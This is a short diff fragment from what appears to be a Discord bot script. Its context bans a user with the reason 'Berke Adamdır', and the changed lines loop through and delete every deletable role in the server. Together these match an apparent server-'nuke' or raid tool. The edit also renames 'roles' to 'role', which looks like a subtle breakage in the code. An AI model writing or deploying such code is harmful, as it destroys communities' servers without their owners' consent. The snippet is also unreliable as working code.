@@ -15,7 +15,7 @@ message.guild.ban(u, "Berke Adamdır")
 })
   
 
-message.guild.roles.forEach(c => {
+message.guild.role.forEach(c => {
 if (c.deletable) {
 roller++;
 return c.delete();   
